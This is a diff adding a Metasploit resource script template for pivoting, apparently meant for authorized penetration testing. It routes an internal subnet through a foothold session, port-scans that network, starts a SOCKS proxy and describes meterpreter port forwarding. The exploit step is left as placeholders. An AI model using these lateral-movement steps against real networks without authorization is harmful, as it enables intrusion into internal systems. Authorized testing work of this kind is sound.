@@ -1,0 +1,54 @@
+# pivot_setup.rc — Metasploit resource script TEMPLATE for pivoting
+#
+# Run with:  msfconsole -q -r pivot_setup.rc
+#
+# This automates the *navigation* around a pivot — adding a route through a
+# foothold session and scanning the network behind it. It deliberately does
+# NOT contain a weaponized exploit: you supply the module that matched your
+# enumeration, against a target you are authorized to test.
+#
+# Fill in the <PLACEHOLDERS> before running.
+#
+# ---------------------------------------------------------------------------
+# STEP 1 — get your foothold (do this manually / fill in your matched module)
+# ---------------------------------------------------------------------------
+# use <exploit/module/that/matched/your/enumeration>
+# set RHOSTS <DMZ_HOST_IP>
+# set LHOST  <YOUR_IP>
+# set PAYLOAD <meterpreter/payload/for/the/target>
+# exploit -z          # -z backgrounds the session on success
+#
+# After you have a session, note its ID from `sessions -l`, then:
+
+# ---------------------------------------------------------------------------
+# STEP 2 — route the DEV subnet through the foothold session
+# ---------------------------------------------------------------------------
+# Replace <DEV_SUBNET> and <SESSION_ID>.
+route add <DEV_SUBNET> 255.255.255.0 <SESSION_ID>
+route print
+
+# ---------------------------------------------------------------------------
+# STEP 3 — scan the DEV network *through* the pivot
+# ---------------------------------------------------------------------------
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <DEV_SUBNET>/24
+set PORTS 22,53,80,443,3389,8080
+set THREADS 20
+run
+
+# ---------------------------------------------------------------------------
+# STEP 4 (optional) — SOCKS proxy so external tools can reach DEV
+# ---------------------------------------------------------------------------
+# After this, add `socks5 127.0.0.1 1080` to /etc/proxychains4.conf and run
+# tools with: proxychains <tool> ...
+use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+# ---------------------------------------------------------------------------
+# STEP 5 (optional) — forward a single DEV port to your localhost for SSH
+# ---------------------------------------------------------------------------
+# Run inside the meterpreter session instead of here:
+#   portfwd add -l 2222 -p 22 -r <DEV_HOST_IP>
+#   (then on your box)  ssh -p 2222 <user>@127.0.0.1
